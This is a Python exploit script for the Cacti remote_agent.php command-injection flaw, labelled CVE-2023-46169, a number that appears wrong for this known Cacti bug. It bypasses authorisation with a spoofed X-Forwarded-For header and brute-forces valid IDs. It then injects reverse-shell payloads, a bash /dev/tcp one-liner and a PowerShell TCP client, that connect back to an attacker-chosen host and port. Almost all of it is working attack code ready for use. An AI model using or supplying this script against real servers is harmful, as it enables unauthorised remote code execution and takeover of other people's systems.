import requests
import urllib
import argparse
from rich.console import Console
import base64 as b64

console = Console()
class cve_2023_46169:
    
    def exploit(self,url):
        url = url.rstrip('/')+'/remote_agent.php'
        console.log(f"sending to url: {url}")
        headers = {"X-Forwarded-For": "127.0.0.1"}
        r = requests.get(url,headers=headers)
        console.log(f" Status code: {r.status_code}")
        if (r.text != "FATAL: You are not authorized to use this service" and r.status_code != 403):
            console.log("[+] Vulnerable [+]")
        # starting the bruteforcing:
            console.log("[+] Starting the bruteforcing [+]")
            for n in range(1,5):
                for m in range(1,10):
                    id_vulnurl = f"{url}?action=polldata&poller_id=1&host_id={n}&local_data_ids[]={m}"
                    r = requests.get(id_vulnurl, headers=headers)
                    if r.text != '[]':
                        RDname = r.json()[0]["rrd_name"]
                        if RDname == "polling_time" or RDname == "uptime":
                            console.log("[+] Bruteforce Success [+]")
                            console.log(f" >> {n} {m} << ")
                            return True, n, m
        return False, 1, 1

    def reverse_shell(self,url,lhost,lport,payload=None):
        new_url = url.rstrip('/')+'/remote_agent.php'
        headers = {"X-Forwarded-For": "127.0.0.1"}
        success,host_id,data_ids = self.exploit(url)
        if success:
            os = input(" Possible OS linux or windows: ")
            if os.lower() == "windows":
                payload = """ powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('%s', %s);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" """%(lhost,lport)
                encoded_payload = "powershell -e "+ str(b64.b64encode(payload.encode("ascii")))
                console.log(f"Running the payload: {encoded_payload}")
                PayloadEncoded = urllib.parse.quote(payload)
                InjectRequest = f"{new_url}?action=polldata&poller_id=;{PayloadEncoded}&host_id={host_id}&local_data_ids[]={data_ids}"
                r = requests.get(InjectRequest, headers=headers)    
            elif os.lower() == "linux":
                payload = f""" bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" """
                console.log(f"Running the payload: {payload}")
                PayloadEncoded = urllib.parse.quote(payload)
                InjectRequest = f"{new_url}?action=polldata&poller_id=;{PayloadEncoded}&host_id={host_id}&local_data_ids[]={data_ids}"
                r = requests.get(InjectRequest, headers=headers)

    
    def main(self):
        # now we need to do argparse:
        parser = argparse.ArgumentParser(description='CVE-2023-46169 Cacti server RCE via remote.php')
        parser.add_argument('-u','--url', type=str, help='URL of the remote agent', required=True)
        parser.add_argument('-lh','--lhost', type=str, help='Local host', required=True)
        parser.add_argument('-lp','--lport', type=str, help='Local port', required=True)
        args = parser.parse_args()
        # now we need to do the bruteforcing:
        # success, n, m = self.exploit(args.url)
    
        console.log("[+] success proceeding to reverse shell [+]")
        self.reverse_shell(args.url,args.lhost,args.lport)
if __name__ == '__main__':
    obj = cve_2023_46169()
    obj.main()